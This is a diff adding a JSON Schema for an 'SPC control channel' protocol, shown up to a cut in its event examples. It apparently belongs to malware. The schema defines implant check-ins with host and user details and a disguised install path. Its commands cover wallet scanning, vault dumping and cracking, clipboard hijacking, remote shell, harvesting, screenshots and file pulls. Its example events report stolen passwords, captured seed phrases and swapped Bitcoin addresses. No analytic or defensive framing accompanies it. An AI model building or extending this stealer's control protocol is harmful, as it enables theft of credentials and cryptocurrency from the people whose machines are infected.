@@ -1,0 +1,2634 @@
+{
+  "$schema": "http://json-schema.org/draft-07/schema#",
+  "$id": "https://contract.spc/v1/ws-schemas.json",
+  "title": "SPC control channel frame v1.1",
+  "type": "object",
+  "additionalProperties": false,
+  "required": [
+    "v",
+    "id",
+    "seq",
+    "ts",
+    "type",
+    "nonce",
+    "sig"
+  ],
+  "properties": {
+    "v": {
+      "const": 1
+    },
+    "id": {
+      "type": "string",
+      "pattern": "^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$",
+      "examples": [
+        "3f0c4b5e-7a21-4c8d-9e11-2b6a8d0c4f77"
+      ]
+    },
+    "seq": {
+      "type": "integer",
+      "minimum": 1,
+      "maximum": 9007199254740991
+    },
+    "ts": {
+      "type": "integer",
+      "minimum": 0
+    },
+    "type": {
+      "enum": [
+        "hello",
+        "hello_ok",
+        "cmd",
+        "result",
+        "event",
+        "ack",
+        "ping",
+        "pong",
+        "bye"
+      ]
+    },
+    "nonce": {
+      "type": "string",
+      "pattern": "^[A-Za-z0-9_-]{22}$",
+      "examples": [
+        "QEFCQ0RFRkdISUpLTE1OTw"
+      ]
+    },
+    "reply_to": {
+      "type": "string",
+      "pattern": "^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$",
+      "examples": [
+        "3f0c4b5e-7a21-4c8d-9e11-2b6a8d0c4f77"
+      ]
+    },
+    "body": {
+      "$ref": "#/definitions/resultBody"
+    },
+    "hostname": {
+      "type": "string",
+      "minLength": 1,
+      "maxLength": 128
+    },
+    "user": {
+      "type": "string",
+      "minLength": 1,
+      "maxLength": 128
+    },
+    "os": {
+      "type": "string",
+      "maxLength": 160
+    },
+    "cpu": {
+      "type": "string",
+      "maxLength": 160
+    },
+    "ram": {
+      "type": "string",
+      "maxLength": 64
+    },
+    "gpu": {
+      "type": "string",
+      "maxLength": 160
+    },
+    "resolution": {
+      "type": "string",
+      "maxLength": 64
+    },
+    "java": {
+      "type": "string",
+      "maxLength": 64
+    },
+    "agent": {
+      "type": "string",
+      "minLength": 1,
+      "maxLength": 32
+    },
+    "public_ip": {
+      "type": "string",
+      "minLength": 1,
+      "maxLength": 64
+    },
+    "path": {
+      "type": "string",
+      "minLength": 1,
+      "maxLength": 1024
+    },
+    "first": {
+      "type": "boolean"
+    },
+    "expect_seq_in": {
+      "type": "integer",
+      "minimum": 0,
+      "maximum": 9007199254740991
+    },
+    "expect_seq_out": {
+      "type": "integer",
+      "minimum": 0,
+      "maximum": 9007199254740991
+    },
+    "device_id": {
+      "type": "string",
+      "pattern": "^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$",
+      "examples": [
+        "3f0c4b5e-7a21-4c8d-9e11-2b6a8d0c4f77"
+      ]
+    },
+    "server_time": {
+      "type": "integer",
+      "minimum": 0
+    },
+    "heartbeat_sec": {
+      "type": "integer",
+      "minimum": 1
+    },
+    "poll_sec": {
+      "type": "integer",
+      "minimum": 1
+    },
+    "name": {
+      "enum": [
+        "scan_wallets",
+        "dump_vault",
+        "crack_vault",
+        "clip_start",
+        "clip_stop",
+        "shell",
+        "harvest",
+        "screenshot",
+        "file_pull",
+        "cancel",
+        "agent"
+      ]
+    },
+    "args": {
+      "type": "object"
+    },
+    "task_id": {
+      "type": "string",
+      "pattern": "^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$",
+      "examples": [
+        "3f0c4b5e-7a21-4c8d-9e11-2b6a8d0c4f77"
+      ]
+    },
+    "timeout_ms": {
+      "type": "integer",
+      "minimum": 1,
+      "maximum": 300000,
+      "default": 30000
+    },
+    "kind": {
+      "enum": [
+        "wallet_detected",
+        "wallet_closed",
+        "password",
+        "clipboard_secret",
+        "clipboard_replace",
+        "seed_found"
+      ]
+    },
+    "data": {
+      "type": "object"
+    },
+    "legacy": {
+      "type": "string",
+      "maxLength": 4096
+    },
+    "code": {
+      "enum": [
+        1000,
+        4400,
+        4401,
+        4403,
+        4408,
+        4409,
+        4429
+      ]
+    },
+    "reason": {
+      "type": "string",
+      "maxLength": 512
+    },
+    "sig": {
+      "type": "string",
+      "pattern": "^[A-Za-z0-9_-]{43}$",
+      "examples": [
+        "Qs5y-gv3masCumW9Xa7GCJhfHac5OwLuXw3AHmp19-Y"
+      ]
+    }
+  },
+  "allOf": [
+    {
+      "if": {
+        "properties": {
+          "type": {
+            "const": "hello"
+          }
+        },
+        "required": [
+          "type"
+        ]
+      },
+      "then": {
+        "properties": {},
+        "required": [
+          "hostname",
+          "user",
+          "os",
+          "cpu",
+          "ram",
+          "gpu",
+          "resolution",
+          "java",
+          "agent",
+          "public_ip",
+          "path",
+          "first",
+          "expect_seq_in"
+        ],
+        "not": {
+          "anyOf": [
+            {
+              "required": [
+                "args"
+              ]
+            },
+            {
+              "required": [
+                "code"
+              ]
+            },
+            {
+              "required": [
+                "data"
+              ]
+            },
+            {
+              "required": [
+                "expect_seq_out"
+              ]
+            },
+            {
+              "required": [
+                "heartbeat_sec"
+              ]
+            },
+            {
+              "required": [
+                "kind"
+              ]
+            },
+            {
+              "required": [
+                "legacy"
+              ]
+            },
+            {
+              "required": [
+                "name"
+              ]
+            },
+            {
+              "required": [
+                "ok"
+              ]
+            },
+            {
+              "required": [
+                "poll_sec"
+              ]
+            },
+            {
+              "required": [
+                "reason"
+              ]
+            },
+            {
+              "required": [
+                "result"
+              ]
+            },
+            {
+              "required": [
+                "server_time"
+              ]
+            },
+            {
+              "required": [
+                "status"
+              ]
+            },
+            {
+              "required": [
+                "task_id"
+              ]
+            },
+            {
+              "required": [
+                "reply_to"
+              ]
+            }
+          ]
+        }
+      }
+    },
+    {
+      "if": {
+        "properties": {
+          "type": {
+            "const": "hello_ok"
+          }
+        },
+        "required": [
+          "type"
+        ]
+      },
+      "then": {
+        "properties": {},
+        "required": [
+          "server_time",
+          "heartbeat_sec",
+          "poll_sec",
+          "expect_seq_in",
+          "expect_seq_out"
+        ],
+        "not": {
+          "anyOf": [
+            {
+              "required": [
+                "agent"
+              ]
+            },
+            {
+              "required": [
+                "args"
+              ]
+            },
+            {
+              "required": [
+                "code"
+              ]
+            },
+            {
+              "required": [
+                "cpu"
+              ]
+            },
+            {
+              "required": [
+                "data"
+              ]
+            },
+            {
+              "required": [
+                "first"
+              ]
+            },
+            {
+              "required": [
+                "gpu"
+              ]
+            },
+            {
+              "required": [
+                "hostname"
+              ]
+            },
+            {
+              "required": [
+                "java"
+              ]
+            },
+            {
+              "required": [
+                "kind"
+              ]
+            },
+            {
+              "required": [
+                "legacy"
+              ]
+            },
+            {
+              "required": [
+                "name"
+              ]
+            },
+            {
+              "required": [
+                "ok"
+              ]
+            },
+            {
+              "required": [
+                "os"
+              ]
+            },
+            {
+              "required": [
+                "path"
+              ]
+            },
+            {
+              "required": [
+                "public_ip"
+              ]
+            },
+            {
+              "required": [
+                "ram"
+              ]
+            },
+            {
+              "required": [
+                "reason"
+              ]
+            },
+            {
+              "required": [
+                "resolution"
+              ]
+            },
+            {
+              "required": [
+                "result"
+              ]
+            },
+            {
+              "required": [
+                "status"
+              ]
+            },
+            {
+              "required": [
+                "task_id"
+              ]
+            },
+            {
+              "required": [
+                "user"
+              ]
+            },
+            {
+              "required": [
+                "reply_to"
+              ]
+            }
+          ]
+        }
+      }
+    },
+    {
+      "if": {
+        "properties": {
+          "type": {
+            "const": "cmd"
+          }
+        },
+        "required": [
+          "type"
+        ]
+      },
+      "then": {
+        "properties": {
+          "args": {
+            "type": "object"
+          }
+        },
+        "required": [
+          "name",
+          "args",
+          "task_id"
+        ],
+        "not": {
+          "anyOf": [
+            {
+              "required": [
+                "agent"
+              ]
+            },
+            {
+              "required": [
+                "code"
+              ]
+            },
+            {
+              "required": [
+                "cpu"
+              ]
+            },
+            {
+              "required": [
+                "data"
+              ]
+            },
+            {
+              "required": [
+                "expect_seq_in"
+              ]
+            },
+            {
+              "required": [
+                "expect_seq_out"
+              ]
+            },
+            {
+              "required": [
+                "first"
+              ]
+            },
+            {
+              "required": [
+                "gpu"
+              ]
+            },
+            {
+              "required": [
+                "heartbeat_sec"
+              ]
+            },
+            {
+              "required": [
+                "hostname"
+              ]
+            },
+            {
+              "required": [
+                "java"
+              ]
+            },
+            {
+              "required": [
+                "kind"
+              ]
+            },
+            {
+              "required": [
+                "legacy"
+              ]
+            },
+            {
+              "required": [
+                "ok"
+              ]
+            },
+            {
+              "required": [
+                "os"
+              ]
+            },
+            {
+              "required": [
+                "path"
+              ]
+            },
+            {
+              "required": [
+                "poll_sec"
+              ]
+            },
+            {
+              "required": [
+                "public_ip"
+              ]
+            },
+            {
+              "required": [
+                "ram"
+              ]
+            },
+            {
+              "required": [
+                "reason"
+              ]
+            },
+            {
+              "required": [
+                "resolution"
+              ]
+            },
+            {
+              "required": [
+                "result"
+              ]
+            },
+            {
+              "required": [
+                "server_time"
+              ]
+            },
+            {
+              "required": [
+                "status"
+              ]
+            },
+            {
+              "required": [
+                "user"
+              ]
+            },
+            {
+              "required": [
+                "reply_to"
+              ]
+            }
+          ]
+        },
+        "allOf": [
+          {
+            "if": {
+              "properties": {
+                "name": {
+                  "const": "scan_wallets"
+                }
+              }
+            },
+            "then": {
+              "properties": {
+                "args": {
+                  "$ref": "spc:tasks:v1#/types/scan_wallets/params"
+                }
+              }
+            }
+          },
+          {
+            "if": {
+              "properties": {
+                "name": {
+                  "const": "dump_vault"
+                }
+              }
+            },
+            "then": {
+              "properties": {
+                "args": {
+                  "$ref": "spc:tasks:v1#/types/dump_vault/params"
+                }
+              }
+            }
+          },
+          {
+            "if": {
+              "properties": {
+                "name": {
+                  "const": "crack_vault"
+                }
+              }
+            },
+            "then": {
+              "properties": {
+                "args": {
+                  "$ref": "spc:tasks:v1#/types/crack_vault/params"
+                }
+              }
+            }
+          },
+          {
+            "if": {
+              "properties": {
+                "name": {
+                  "const": "clip_start"
+                }
+              }
+            },
+            "then": {
+              "properties": {
+                "args": {
+                  "$ref": "spc:tasks:v1#/types/clip_start/params"
+                }
+              }
+            }
+          },
+          {
+            "if": {
+              "properties": {
+                "name": {
+                  "const": "clip_stop"
+                }
+              }
+            },
+            "then": {
+              "properties": {
+                "args": {
+                  "$ref": "spc:tasks:v1#/types/clip_stop/params"
+                }
+              }
+            }
+          },
+          {
+            "if": {
+              "properties": {
+                "name": {
+                  "const": "shell"
+                }
+              }
+            },
+            "then": {
+              "properties": {
+                "args": {
+                  "$ref": "spc:tasks:v1#/types/shell/params"
+                }
+              }
+            }
+          },
+          {
+            "if": {
+              "properties": {
+                "name": {
+                  "const": "harvest"
+                }
+              }
+            },
+            "then": {
+              "properties": {
+                "args": {
+                  "$ref": "spc:tasks:v1#/types/harvest/params"
+                }
+              }
+            }
+          },
+          {
+            "if": {
+              "properties": {
+                "name": {
+                  "const": "screenshot"
+                }
+              }
+            },
+            "then": {
+              "properties": {
+                "args": {
+                  "$ref": "spc:tasks:v1#/types/screenshot/params"
+                }
+              }
+            }
+          },
+          {
+            "if": {
+              "properties": {
+                "name": {
+                  "const": "file_pull"
+                }
+              }
+            },
+            "then": {
+              "properties": {
+                "args": {
+                  "$ref": "spc:tasks:v1#/types/file_pull/params"
+                }
+              }
+            }
+          },
+          {
+            "if": {
+              "properties": {
+                "name": {
+                  "const": "cancel"
+                }
+              }
+            },
+            "then": {
+              "properties": {
+                "args": {
+                  "$ref": "spc:tasks:v1#/types/cancel/params"
+                }
+              }
+            }
+          },
+          {
+            "if": {
+              "properties": {
+                "name": {
+                  "const": "agent"
+                }
+              }
+            },
+            "then": {
+              "properties": {
+                "args": {
+                  "$ref": "spc:tasks:v1#/types/agent/params"
+                }
+              }
+            }
+          }
+        ]
+      }
+    },
+    {
+      "if": {
+        "properties": {
+          "type": {
+            "const": "result"
+          }
+        },
+        "required": [
+          "type"
+        ]
+      },
+      "then": {
+        "properties": {
+          "body": {
+            "$ref": "#/definitions/resultBody"
+          }
+        },
+        "required": [
+          "reply_to",
+          "body"
+        ]
+      }
+    },
+    {
+      "if": {
+        "properties": {
+          "type": {
+            "const": "event"
+          }
+        },
+        "required": [
+          "type"
+        ]
+      },
+      "then": {
+        "properties": {
+          "data": {
+            "$ref": "#/definitions/eventData_event"
+          }
+        },
+        "required": [
+          "kind",
+          "data",
+          "legacy"
+        ],
+        "not": {
+          "anyOf": [
+            {
+              "required": [
+                "agent"
+              ]
+            },
+            {
+              "required": [
+                "args"
+              ]
+            },
+            {
+              "required": [
+                "code"
+              ]
+            },
+            {
+              "required": [
+                "cpu"
+              ]
+            },
+            {
+              "required": [
+                "expect_seq_in"
+              ]
+            },
+            {
+              "required": [
+                "expect_seq_out"
+              ]
+            },
+            {
+              "required": [
+                "first"
+              ]
+            },
+            {
+              "required": [
+                "gpu"
+              ]
+            },
+            {
+              "required": [
+                "heartbeat_sec"
+              ]
+            },
+            {
+              "required": [
+                "hostname"
+              ]
+            },
+            {
+              "required": [
+                "java"
+              ]
+            },
+            {
+              "required": [
+                "name"
+              ]
+            },
+            {
+              "required": [
+                "ok"
+              ]
+            },
+            {
+              "required": [
+                "os"
+              ]
+            },
+            {
+              "required": [
+                "path"
+              ]
+            },
+            {
+              "required": [
+                "poll_sec"
+              ]
+            },
+            {
+              "required": [
+                "public_ip"
+              ]
+            },
+            {
+              "required": [
+                "ram"
+              ]
+            },
+            {
+              "required": [
+                "reason"
+              ]
+            },
+            {
+              "required": [
+                "resolution"
+              ]
+            },
+            {
+              "required": [
+                "result"
+              ]
+            },
+            {
+              "required": [
+                "server_time"
+              ]
+            },
+            {
+              "required": [
+                "status"
+              ]
+            },
+            {
+              "required": [
+                "task_id"
+              ]
+            },
+            {
+              "required": [
+                "user"
+              ]
+            },
+            {
+              "required": [
+                "reply_to"
+              ]
+            }
+          ]
+        }
+      }
+    },
+    {
+      "if": {
+        "properties": {
+          "type": {
+            "const": "ack"
+          }
+        },
+        "required": [
+          "type"
+        ]
+      },
+      "then": {
+        "properties": {},
+        "required": [
+          "reply_to"
+        ],
+        "not": {
+          "anyOf": [
+            {
+              "required": [
+                "agent"
+              ]
+            },
+            {
+              "required": [
+                "args"
+              ]
+            },
+            {
+              "required": [
+                "code"
+              ]
+            },
+            {
+              "required": [
+                "cpu"
+              ]
+            },
+            {
+              "required": [
+                "data"
+              ]
+            },
+            {
+              "required": [
+                "expect_seq_in"
+              ]
+            },
+            {
+              "required": [
+                "expect_seq_out"
+              ]
+            },
+            {
+              "required": [
+                "first"
+              ]
+            },
+            {
+              "required": [
+                "gpu"
+              ]
+            },
+            {
+              "required": [
+                "heartbeat_sec"
+              ]
+            },
+            {
+              "required": [
+                "hostname"
+              ]
+            },
+            {
+              "required": [
+                "java"
+              ]
+            },
+            {
+              "required": [
+                "kind"
+              ]
+            },
+            {
+              "required": [
+                "legacy"
+              ]
+            },
+            {
+              "required": [
+                "name"
+              ]
+            },
+            {
+              "required": [
+                "ok"
+              ]
+            },
+            {
+              "required": [
+                "os"
+              ]
+            },
+            {
+              "required": [
+                "path"
+              ]
+            },
+            {
+              "required": [
+                "poll_sec"
+              ]
+            },
+            {
+              "required": [
+                "public_ip"
+              ]
+            },
+            {
+              "required": [
+                "ram"
+              ]
+            },
+            {
+              "required": [
+                "reason"
+              ]
+            },
+            {
+              "required": [
+                "resolution"
+              ]
+            },
+            {
+              "required": [
+                "result"
+              ]
+            },
+            {
+              "required": [
+                "server_time"
+              ]
+            },
+            {
+              "required": [
+                "status"
+              ]
+            },
+            {
+              "required": [
+                "task_id"
+              ]
+            },
+            {
+              "required": [
+                "user"
+              ]
+            }
+          ]
+        }
+      }
+    },
+    {
+      "if": {
+        "properties": {
+          "type": {
+            "const": "ping"
+          }
+        },
+        "required": [
+          "type"
+        ]
+      },
+      "then": {
+        "properties": {},
+        "required": [],
+        "not": {
+          "anyOf": [
+            {
+              "required": [
+                "agent"
+              ]
+            },
+            {
+              "required": [
+                "args"
+              ]
+            },
+            {
+              "required": [
+                "code"
+              ]
+            },
+            {
+              "required": [
+                "cpu"
+              ]
+            },
+            {
+              "required": [
+                "data"
+              ]
+            },
+            {
+              "required": [
+                "expect_seq_in"
+              ]
+            },
+            {
+              "required": [
+                "expect_seq_out"
+              ]
+            },
+            {
+              "required": [
+                "first"
+              ]
+            },
+            {
+              "required": [
+                "gpu"
+              ]
+            },
+            {
+              "required": [
+                "heartbeat_sec"
+              ]
+            },
+            {
+              "required": [
+                "hostname"
+              ]
+            },
+            {
+              "required": [
+                "java"
+              ]
+            },
+            {
+              "required": [
+                "kind"
+              ]
+            },
+            {
+              "required": [
+                "legacy"
+              ]
+            },
+            {
+              "required": [
+                "name"
+              ]
+            },
+            {
+              "required": [
+                "ok"
+              ]
+            },
+            {
+              "required": [
+                "os"
+              ]
+            },
+            {
+              "required": [
+                "path"
+              ]
+            },
+            {
+              "required": [
+                "poll_sec"
+              ]
+            },
+            {
+              "required": [
+                "public_ip"
+              ]
+            },
+            {
+              "required": [
+                "ram"
+              ]
+            },
+            {
+              "required": [
+                "reason"
+              ]
+            },
+            {
+              "required": [
+                "resolution"
+              ]
+            },
+            {
+              "required": [
+                "result"
+              ]
+            },
+            {
+              "required": [
+                "server_time"
+              ]
+            },
+            {
+              "required": [
+                "status"
+              ]
+            },
+            {
+              "required": [
+                "task_id"
+              ]
+            },
+            {
+              "required": [
+                "user"
+              ]
+            },
+            {
+              "required": [
+                "reply_to"
+              ]
+            }
+          ]
+        }
+      }
+    },
+    {
+      "if": {
+        "properties": {
+          "type": {
+            "const": "pong"
+          }
+        },
+        "required": [
+          "type"
+        ]
+      },
+      "then": {
+        "properties": {},
+        "required": [
+          "reply_to"
+        ],
+        "not": {
+          "anyOf": [
+            {
+              "required": [
+                "agent"
+              ]
+            },
+            {
+              "required": [
+                "args"
+              ]
+            },
+            {
+              "required": [
+                "code"
+              ]
+            },
+            {
+              "required": [
+                "cpu"
+              ]
+            },
+            {
+              "required": [
+                "data"
+              ]
+            },
+            {
+              "required": [
+                "expect_seq_in"
+              ]
+            },
+            {
+              "required": [
+                "expect_seq_out"
+              ]
+            },
+            {
+              "required": [
+                "first"
+              ]
+            },
+            {
+              "required": [
+                "gpu"
+              ]
+            },
+            {
+              "required": [
+                "heartbeat_sec"
+              ]
+            },
+            {
+              "required": [
+                "hostname"
+              ]
+            },
+            {
+              "required": [
+                "java"
+              ]
+            },
+            {
+              "required": [
+                "kind"
+              ]
+            },
+            {
+              "required": [
+                "legacy"
+              ]
+            },
+            {
+              "required": [
+                "name"
+              ]
+            },
+            {
+              "required": [
+                "ok"
+              ]
+            },
+            {
+              "required": [
+                "os"
+              ]
+            },
+            {
+              "required": [
+                "path"
+              ]
+            },
+            {
+              "required": [
+                "poll_sec"
+              ]
+            },
+            {
+              "required": [
+                "public_ip"
+              ]
+            },
+            {
+              "required": [
+                "ram"
+              ]
+            },
+            {
+              "required": [
+                "reason"
+              ]
+            },
+            {
+              "required": [
+                "resolution"
+              ]
+            },
+            {
+              "required": [
+                "result"
+              ]
+            },
+            {
+              "required": [
+                "server_time"
+              ]
+            },
+            {
+              "required": [
+                "status"
+              ]
+            },
+            {
+              "required": [
+                "task_id"
+              ]
+            },
+            {
+              "required": [
+                "user"
+              ]
+            }
+          ]
+        }
+      }
+    },
+    {
+      "if": {
+        "properties": {
+          "type": {
+            "const": "bye"
+          }
+        },
+        "required": [
+          "type"
+        ]
+      },
+      "then": {
+        "properties": {},
+        "required": [
+          "code",
+          "reason"
+        ],
+        "not": {
+          "anyOf": [
+            {
+              "required": [
+                "agent"
+              ]
+            },
+            {
+              "required": [
+                "args"
+              ]
+            },
+            {
+              "required": [
+                "cpu"
+              ]
+            },
+            {
+              "required": [
+                "data"
+              ]
+            },
+            {
+              "required": [
+                "expect_seq_in"
+              ]
+            },
+            {
+              "required": [
+                "expect_seq_out"
+              ]
+            },
+            {
+              "required": [
+                "first"
+              ]
+            },
+            {
+              "required": [
+                "gpu"
+              ]
+            },
+            {
+              "required": [
+                "heartbeat_sec"
+              ]
+            },
+            {
+              "required": [
+                "hostname"
+              ]
+            },
+            {
+              "required": [
+                "java"
+              ]
+            },
+            {
+              "required": [
+                "kind"
+              ]
+            },
+            {
+              "required": [
+                "legacy"
+              ]
+            },
+            {
+              "required": [
+                "name"
+              ]
+            },
+            {
+              "required": [
+                "ok"
+              ]
+            },
+            {
+              "required": [
+                "os"
+              ]
+            },
+            {
+              "required": [
+                "path"
+              ]
+            },
+            {
+              "required": [
+                "poll_sec"
+              ]
+            },
+            {
+              "required": [
+                "public_ip"
+              ]
+            },
+            {
+              "required": [
+                "ram"
+              ]
+            },
+            {
+              "required": [
+                "resolution"
+              ]
+            },
+            {
+              "required": [
+                "result"
+              ]
+            },
+            {
+              "required": [
+                "server_time"
+              ]
+            },
+            {
+              "required": [
+                "status"
+              ]
+            },
+            {
+              "required": [
+                "task_id"
+              ]
+            },
+            {
+              "required": [
+                "user"
+              ]
+            },
+            {
+              "required": [
+                "reply_to"
+              ]
+            }
+          ]
+        }
+      }
+    }
+  ],
+  "definitions": {
+    "uuid": {
+      "type": "string",
+      "pattern": "^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$",
+      "examples": [
+        "3f0c4b5e-7a21-4c8d-9e11-2b6a8d0c4f77"
+      ]
+    },
+    "seq": {
+      "type": "integer",
+      "minimum": 1,
+      "maximum": 9007199254740991
+    },
+    "cursor": {
+      "type": "integer",
+      "minimum": 0,
+      "maximum": 9007199254740991
+    },
+    "nonce": {
+      "type": "string",
+      "pattern": "^[A-Za-z0-9_-]{22}$",
+      "examples": [
+        "QEFCQ0RFRkdISUpLTE1OTw"
+      ]
+    },
+    "sig": {
+      "type": "string",
+      "pattern": "^[A-Za-z0-9_-]{43}$",
+      "examples": [
+        "Qs5y-gv3masCumW9Xa7GCJhfHac5OwLuXw3AHmp19-Y"
+      ]
+    },
+    "hello": {
+      "type": "object",
+      "additionalProperties": false,
+      "required": [
+        "hostname",
+        "user",
+        "os",
+        "cpu",
+        "ram",
+        "gpu",
+        "resolution",
+        "java",
+        "agent",
+        "public_ip",
+        "path",
+        "first",
+        "expect_seq_in"
+      ],
+      "properties": {
+        "hostname": {
+          "type": "string",
+          "minLength": 1,
+          "maxLength": 128
+        },
+        "user": {
+          "type": "string",
+          "minLength": 1,
+          "maxLength": 128
+        },
+        "os": {
+          "type": "string",
+          "maxLength": 160
+        },
+        "cpu": {
+          "type": "string",
+          "maxLength": 160
+        },
+        "ram": {
+          "type": "string",
+          "maxLength": 64
+        },
+        "gpu": {
+          "type": "string",
+          "maxLength": 160
+        },
+        "resolution": {
+          "type": "string",
+          "maxLength": 64
+        },
+        "java": {
+          "type": "string",
+          "maxLength": 64
+        },
+        "agent": {
+          "type": "string",
+          "minLength": 1,
+          "maxLength": 32
+        },
+        "public_ip": {
+          "type": "string",
+          "minLength": 1,
+          "maxLength": 64
+        },
+        "path": {
+          "type": "string",
+          "minLength": 1,
+          "maxLength": 1024
+        },
+        "first": {
+          "type": "boolean"
+        },
+        "expect_seq_in": {
+          "type": "integer",
+          "minimum": 0,
+          "maximum": 9007199254740991
+        }
+      },
+      "examples": [
+        {
+          "hostname": "DESKTOP-01",
+          "user": "alice",
+          "os": "Windows 10 10.0.19045",
+          "cpu": "AMD Ryzen 5",
+          "ram": "16384 MB",
+          "gpu": "NVIDIA GTX 1060",
+          "resolution": "1920x1080",
+          "java": "17.0.10",
+          "agent": "0.3.7",
+          "public_ip": "unknown",
+          "path": "C:\\Users\\alice\\AppData\\Local\\Microsoft\\Java",
+          "first": true,
+          "expect_seq_in": 0
+        }
+      ]
+    },
+    "hello_ok": {
+      "type": "object",
+      "additionalProperties": false,
+      "required": [
+        "server_time",
+        "heartbeat_sec",
+        "poll_sec",
+        "expect_seq_in",
+        "expect_seq_out"
+      ],
+      "properties": {
+        "server_time": {
+          "type": "integer",
+          "minimum": 0
+        },
+        "heartbeat_sec": {
+          "type": "integer",
+          "minimum": 1
+        },
+        "poll_sec": {
+          "type": "integer",
+          "minimum": 1
+        },
+        "expect_seq_in": {
+          "type": "integer",
+          "minimum": 0,
+          "maximum": 9007199254740991
+        },
+        "expect_seq_out": {
+          "type": "integer",
+          "minimum": 0,
+          "maximum": 9007199254740991
+        }
+      },
+      "examples": [
+        {
+          "server_time": 1767225600,
+          "heartbeat_sec": 30,
+          "poll_sec": 20,
+          "expect_seq_in": 0,
+          "expect_seq_out": 0
+        }
+      ]
+    },
+    "cmd": {
+      "type": "object",
+      "additionalProperties": false,
+      "required": [
+        "name",
+        "args",
+        "task_id"
+      ],
+      "properties": {
+        "name": {
+          "enum": [
+            "scan_wallets",
+            "dump_vault",
+            "crack_vault",
+            "clip_start",
+            "clip_stop",
+            "shell",
+            "harvest",
+            "screenshot",
+            "file_pull",
+            "cancel",
+            "agent"
+          ]
+        },
+        "args": {
+          "type": "object"
+        },
+        "task_id": {
+          "type": "string",
+          "pattern": "^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$",
+          "examples": [
+            "3f0c4b5e-7a21-4c8d-9e11-2b6a8d0c4f77"
+          ]
+        },
+        "timeout_ms": {
+          "type": "integer",
+          "minimum": 1,
+          "maximum": 300000,
+          "default": 30000
+        }
+      },
+      "examples": [
+        {
+          "name": "shell",
+          "args": {
+            "command": "whoami"
+          },
+          "task_id": "9b2f1a34-5c6d-4e7f-8a90-1b2c3d4e5f60",
+          "timeout_ms": 65000
+        }
+      ],
+      "allOf": [
+        {
+          "if": {
+            "properties": {
+              "name": {
+                "const": "scan_wallets"
+              }
+            }
+          },
+          "then": {
+            "properties": {
+              "args": {
+                "$ref": "spc:tasks:v1#/types/scan_wallets/params"
+              }
+            }
+          }
+        },
+        {
+          "if": {
+            "properties": {
+              "name": {
+                "const": "dump_vault"
+              }
+            }
+          },
+          "then": {
+            "properties": {
+              "args": {
+                "$ref": "spc:tasks:v1#/types/dump_vault/params"
+              }
+            }
+          }
+        },
+        {
+          "if": {
+            "properties": {
+              "name": {
+                "const": "crack_vault"
+              }
+            }
+          },
+          "then": {
+            "properties": {
+              "args": {
+                "$ref": "spc:tasks:v1#/types/crack_vault/params"
+              }
+            }
+          }
+        },
+        {
+          "if": {
+            "properties": {
+              "name": {
+                "const": "clip_start"
+              }
+            }
+          },
+          "then": {
+            "properties": {
+              "args": {
+                "$ref": "spc:tasks:v1#/types/clip_start/params"
+              }
+            }
+          }
+        },
+        {
+          "if": {
+            "properties": {
+              "name": {
+                "const": "clip_stop"
+              }
+            }
+          },
+          "then": {
+            "properties": {
+              "args": {
+                "$ref": "spc:tasks:v1#/types/clip_stop/params"
+              }
+            }
+          }
+        },
+        {
+          "if": {
+            "properties": {
+              "name": {
+                "const": "shell"
+              }
+            }
+          },
+          "then": {
+            "properties": {
+              "args": {
+                "$ref": "spc:tasks:v1#/types/shell/params"
+              }
+            }
+          }
+        },
+        {
+          "if": {
+            "properties": {
+              "name": {
+                "const": "harvest"
+              }
+            }
+          },
+          "then": {
+            "properties": {
+              "args": {
+                "$ref": "spc:tasks:v1#/types/harvest/params"
+              }
+            }
+          }
+        },
+        {
+          "if": {
+            "properties": {
+              "name": {
+                "const": "screenshot"
+              }
+            }
+          },
+          "then": {
+            "properties": {
+              "args": {
+                "$ref": "spc:tasks:v1#/types/screenshot/params"
+              }
+            }
+          }
+        },
+        {
+          "if": {
+            "properties": {
+              "name": {
+                "const": "file_pull"
+              }
+            }
+          },
+          "then": {
+            "properties": {
+              "args": {
+                "$ref": "spc:tasks:v1#/types/file_pull/params"
+              }
+            }
+          }
+        },
+        {
+          "if": {
+            "properties": {
+              "name": {
+                "const": "cancel"
+              }
+            }
+          },
+          "then": {
+            "properties": {
+              "args": {
+                "$ref": "spc:tasks:v1#/types/cancel/params"
+              }
+            }
+          }
+        },
+        {
+          "if": {
+            "properties": {
+              "name": {
+                "const": "agent"
+              }
+            }
+          },
+          "then": {
+            "properties": {
+              "args": {
+                "$ref": "spc:tasks:v1#/types/agent/params"
+              }
+            }
+          }
+        }
+      ]
+    },
+    "event": {
+      "type": "object",
+      "additionalProperties": false,
+      "required": [
+        "kind",
+        "data",
+        "legacy"
+      ],
+      "properties": {
+        "kind": {
+          "enum": [
+            "wallet_detected",
+            "wallet_closed",
+            "password",
+            "clipboard_secret",
+            "clipboard_replace",
+            "seed_found"
+          ]
+        },
+        "data": {
+          "type": "object"
+        },
+        "legacy": {
+          "type": "string",
+          "maxLength": 4096
+        }
+      },
+      "examples": [
+        {
+          "kind": "wallet_detected",
+          "data": {
+            "name": "Electrum",
+            "pid": 4242
+          },
+          "legacy": "wallet detected: Electrum (4242)"
+        },
+        {
+          "kind": "wallet_closed",
+          "data": {},
+          "legacy": "wallet closed"
+        },
+        {
+          "kind": "password",
+          "data": {
+            "process": "chrome.exe",
+            "title": "Gmail",
+            "text": "hunter2"
+          },
+          "legacy": "password? chrome.exe | Gmail | hunter2"
+        },
+        {
+          "kind": "clipboard_secret",
+          "data": {
+            "kind": "seed-12",
+            "value": "abandon ability able about above absent absorb abstract absurd abuse access accident",
+            "words": 12
+          },
+          "legacy": "clipboard seed (12 palabras): abandon ability able about above absent absorb abstract absurd abuse access accident"
+        },
+        {
+          "kind": "clipboard_replace",
+          "data": {
+            "coin": "btc",
+            "original": "bc1qold",
+            "replacement": "bc1qnew"
+          },
+          "legacy": "clipboard: btc bc1qold -> bc1qnew"
+        },
+        {
+          "kind": "seed_found",
